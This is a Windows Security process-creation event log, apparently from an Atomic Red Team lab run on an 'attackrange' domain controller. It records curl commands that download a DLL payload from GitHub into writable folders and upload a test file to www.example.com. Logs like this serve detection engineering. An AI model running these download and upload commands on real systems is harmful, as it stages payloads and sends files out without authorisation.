12/07/2021 12:49:21 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-137.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1727073
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x59BC35C

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1220
	New Process Name:	C:\Windows\System32\Curl.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x17bc
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	C:\Windows\System32\Curl.exe  -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o C:\Users\ADMINI~1\AppData\Local\Temp\allthethingsx64.dll 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
12/07/2021 12:49:21 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-137.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1727064
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x59BC35C

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xf18
	New Process Name:	C:\Windows\System32\Curl.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x17bc
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	C:\Windows\System32\Curl.exe  -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\programdata\allthethingsx64.dll 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
12/07/2021 12:49:21 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-137.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1727055
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x59BC35C

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xe00
	New Process Name:	C:\Windows\System32\Curl.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x17bc
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	C:\Windows\System32\Curl.exe  -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll --output c:\users\public\music\allthethingsx64.dll 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
12/07/2021 12:49:21 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-137.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1727046
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x59BC35C

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1a34
	New Process Name:	C:\Windows\System32\Curl.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x17bc
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	C:\Windows\System32\Curl.exe  -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\users\public\music\allthethingsx64.dll 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
12/07/2021 12:49:21 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-137.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1727045
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x59BC35C

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x17bc
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1a78
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\system32\cmd.exe" /c "C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\users\public\music\allthethingsx64.dll & C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll --output c:\users\public\music\allthethingsx64.dll & C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\programdata\allthethingsx64.dll & C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o %Temp%\allthethingsx64.dll" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
12/07/2021 12:51:31 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-137.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1727393
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x59BC35C

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x440
	New Process Name:	C:\Windows\System32\Curl.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1a14
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	C:\Windows\System32\Curl.exe  -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o C:\Users\ADMINI~1\AppData\Local\Temp\allthethingsx64.dll 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
12/07/2021 12:51:31 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-137.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1727384
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x59BC35C

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1850
	New Process Name:	C:\Windows\System32\Curl.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1a14
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	C:\Windows\System32\Curl.exe  -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\programdata\allthethingsx64.dll 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
12/07/2021 12:51:31 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-137.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1727374
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x59BC35C

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x71c
	New Process Name:	C:\Windows\System32\Curl.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1a14
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	C:\Windows\System32\Curl.exe  -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll --output c:\users\public\music\allthethingsx64.dll 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
12/07/2021 12:51:31 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-137.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1727360
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x59BC35C

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x13a0
	New Process Name:	C:\Windows\System32\Curl.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1a14
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	C:\Windows\System32\Curl.exe  -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\users\public\music\allthethingsx64.dll 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
12/07/2021 12:51:31 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-137.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1727359
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x59BC35C

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1a14
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1a78
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\system32\cmd.exe" /c "C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\users\public\music\allthethingsx64.dll & C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll --output c:\users\public\music\allthethingsx64.dll & C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\programdata\allthethingsx64.dll & C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o %Temp%\allthethingsx64.dll" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
12/07/2021 12:51:33 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-137.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1727418
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x59BC35C

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1928
	New Process Name:	C:\Windows\System32\Curl.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x116c
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	C:\Windows\System32\Curl.exe  -T c:\temp\atomictestfile.txt www.example.com 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
12/07/2021 12:51:33 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-137.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1727417
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x59BC35C

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x116c
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1a78
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\system32\cmd.exe" /c "C:\Windows\System32\Curl.exe -T c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe --upload-file c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe -d c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe --data c:\temp\atomictestfile.txt www.example.com" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
12/07/2021 12:51:34 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-137.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1727446
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x59BC35C

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1684
	New Process Name:	C:\Windows\System32\Curl.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x116c
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	C:\Windows\System32\Curl.exe  --data c:\temp\atomictestfile.txt www.example.com 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
12/07/2021 12:51:34 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-137.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1727436
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x59BC35C

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1b34
	New Process Name:	C:\Windows\System32\Curl.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x116c
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	C:\Windows\System32\Curl.exe  -d c:\temp\atomictestfile.txt www.example.com 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
12/07/2021 12:51:34 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-137.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1727427
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x59BC35C

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x11fc
	New Process Name:	C:\Windows\System32\Curl.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x116c
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	C:\Windows\System32\Curl.exe  --upload-file c:\temp\atomictestfile.txt www.example.com 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
12/07/2021 12:51:37 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-137.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1727491
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x59BC35C

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xdec
	New Process Name:	C:\Windows\System32\Curl.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x18f4
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	C:\Windows\System32\Curl.exe  --data c:\temp\atomictestfile.txt www.example.com 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
12/07/2021 12:51:37 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-137.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1727482
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x59BC35C

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x148c
	New Process Name:	C:\Windows\System32\Curl.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x18f4
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	C:\Windows\System32\Curl.exe  -d c:\temp\atomictestfile.txt www.example.com 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
12/07/2021 12:51:37 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-137.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1727473
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x59BC35C

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xcfc
	New Process Name:	C:\Windows\System32\Curl.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x18f4
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	C:\Windows\System32\Curl.exe  --upload-file c:\temp\atomictestfile.txt www.example.com 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
12/07/2021 12:51:37 PM
LogName=Security
